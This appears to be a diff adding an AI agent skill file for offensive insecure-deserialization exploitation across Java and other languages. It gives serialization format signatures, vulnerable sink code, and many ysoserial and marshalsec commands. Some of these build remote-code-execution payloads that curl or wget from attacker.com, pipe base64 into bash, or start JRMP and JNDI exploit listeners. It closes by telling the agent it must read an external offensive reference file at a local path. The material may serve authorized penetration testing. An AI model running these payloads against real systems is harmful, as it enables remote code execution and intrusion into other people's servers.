@@ -1,0 +1,136 @@
+---
+name: offensive-deserialization
+description: "Insecure deserialization exploitation across Java, PHP, .NET, Python, Node.js, and Ruby. Covers gadget chain construction with ysoserial/phpggc/ysoserial.net, ObjectInputStream and BinaryFormatter sink identification, pickle __reduce__ RCE, phar:// wrapper abuse, Jackson polymorphic typing, Json.NET TypeNameHandling, ViewState tampering, node-serialize IIFE injection, Ruby Marshal.load and YAML.load gadgets, framework-specific chains for Spring/Hibernate/Laravel/Symfony, modern attack surfaces including Kubernetes admission webhooks and message queue consumers, WAF bypass through encoding layers and content-type manipulation, and serialVersionUID/JMX/RMI vectors. Activate when the engagement involves deserialization sinks, serialized data in cookies or request bodies, gadget chain development, magic method abuse, ysoserial payload generation, or any review of marshalling and unmarshalling logic in target applications."
+---
+
+# Offensive Deserialization
+
+Deserialization vulnerabilities arise when an application reconstructs objects from
+serialized byte streams without validating the type, integrity, or origin of the
+data. Object reconstruction triggers constructors, finalizers, and language-specific
+magic methods, so an attacker who controls the serialized input often achieves remote
+code execution before any application-level validation runs.
+
+## Quick Workflow
+1. Enumerate every entry point accepting opaque binary or encoded data -- cookies,
+   HTTP bodies, headers, message queue messages, file uploads, GraphQL custom scalars,
+   gRPC fields, JMX/RMI endpoints.
+2. Fingerprint the serialization format via magic bytes, content-type headers, and
+   error behavior (see Recognition Signatures).
+3. Determine the server-side language and framework version from error pages, HTTP
+   headers, or source code.
+4. Select candidate gadget chains matching the target classpath or installed packages.
+   Generate payloads with ysoserial, phpggc, ysoserial.net, or manual construction.
+5. Deliver through the identified entry point. Start with DNS-only or sleep-based
+   proof to confirm execution without destructive side effects.
+6. Escalate from proof-of-concept to the engagement objective with authorization.
+7. Document the full chain: entry point, format, gadget chain, library versions, proof.
+
+---
+## Recognition Signatures
+
+| Format | Signature | Notes |
+|---|---|---|
+| Java ObjectInputStream | Hex `ac ed 00 05`, Base64 `rO0AB` | Cookies, POST bodies, JMX/RMI streams |
+| PHP serialize | `O:<len>:"ClassName":` or `a:<count>:{` | Frequently Base64-wrapped in cookies |
+| .NET BinaryFormatter | Base64 `AAEAAAD/////` | ViewState, remoting, session state |
+| Python pickle | Opcodes `\x80\x04\x95` (v4+), older `(dp0` text | Redis caches, Celery tasks, ML pipelines |
+| Ruby Marshal | `\x04\x08` leading bytes | Session cookies in older Rails apps |
+| YAML (any lang) | `--- !ruby/object:` or `!!python/object/apply:` | Tag-based instantiation |
+| Java XMLDecoder | `<?xml` with `<java>` or `<object class=` | Legacy Java admin panels |
+| .NET Json.NET | `"$type":` key in JSON | TypeNameHandling != None |
+| Java Jackson | `["class.name", {` JSON array wrapper | enableDefaultTyping / polymorphic handling |
+
+---
+## Java Deserialization
+
+`ObjectInputStream.readObject()` instantiates arbitrary classes present on the
+classpath. Decades of library code provide usable gadget chains.
+
+### Identifying Sinks
+
+```java
+// Direct ObjectInputStream usage
+ObjectInputStream ois = new ObjectInputStream(inputStream);
+Object obj = ois.readObject();
+
+// XMLDecoder -- equally dangerous, often overlooked
+XMLDecoder decoder = new XMLDecoder(inputStream);
+Object obj = decoder.readObject();
+
+// XStream without allowlist
+XStream xstream = new XStream();
+Object obj = xstream.fromXML(userInput);
+
+// Jackson polymorphic typing -- CVE-2017-7525 and successors
+ObjectMapper mapper = new ObjectMapper();
+mapper.enableDefaultTyping();
+
+// Jackson @JsonTypeInfo on base class
+@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
+public abstract class BaseCommand { }
+
+// JMX/RMI endpoints -- default port 1099, often unauthenticated
+```
+
+### serialVersionUID and Classpath Constraints
+
+Every serializable Java class carries a `serialVersionUID`. A mismatch causes
+`InvalidClassException` before any gadget logic executes. Extract the server's UID
+from error messages or decompiled JARs, then rebuild the payload with ysoserial's
+source. The UID often changes only on major releases, so brute-forcing common
+versions is feasible when the exact version is unknown.
+
+### ysoserial Gadget Chains
+
+Match the chain to libraries present on the target classpath.
+
+```bash
+# CommonsCollections -- most widely applicable
+# CC1: commons-collections 3.1, JDK < 8u72
+java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/cb' > payload.bin
+# CC5: later JDK versions where CC1 is patched
+java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/cb' > payload.bin
+# CC7: Hashtable entry point, bypasses some ObjectInputFilter rules
+java -jar ysoserial.jar CommonsCollections7 'id > /tmp/proof.txt' > payload.bin
+
+# Spring chain -- requires spring-core + spring-beans
+java -jar ysoserial.jar Spring1 'wget http://attacker.com/s.sh -O /tmp/s.sh' > payload.bin
+# Hibernate chain -- requires hibernate-core
+java -jar ysoserial.jar Hibernate1 'bash -c {echo,BASE64}|{base64,-d}|bash' > payload.bin
+# CommonsBeanutils -- present in many apps via shaded dependencies
+java -jar ysoserial.jar CommonsBeanutils1 'ping -c 3 attacker.com' > payload.bin
+
+# URLDNS -- DNS lookup only, no RCE, safe for detection confirmation
+java -jar ysoserial.jar URLDNS 'http://deser-confirm.attacker.com' > payload.bin
+
+# JRMPClient -- redirect deser to attacker-controlled JRMP listener
+java -jar ysoserial.jar JRMPClient 'attacker.com:1099' > payload.bin
+# On attacker host, serve secondary payload via JRMP listener
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
+```
+
+### JMX/RMI Deserialization
+
+JMX and RMI registries accept serialized objects over the wire and are frequently
+exposed without authentication on internal networks.
+
+```bash
+# Scan for RMI registries
+nmap -sV -p 1099,1098,9010,9011 --script rmi-dumpregistry TARGET
+
+# marshalsec: exploit RMI/JNDI
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
+  "http://attacker.com:8080/#ExploitClass" 1099
+```
+
+
+---
+
+## 📚 Deep Reference (Progressive Disclosure)
+
+> ⚠️ **CONTEXT OPTIMIZATION:** The detailed methodology, edge cases, attack vectors, and advanced configurations for this skill are stored externally to save tokens.
+
+To access the full technical reference, you MUST use your iew_file tool to read:
+
+d:\xampp\htdocs\0-fonte\.agent\skills\claude-red-offensive-deserialization\references\reference.md
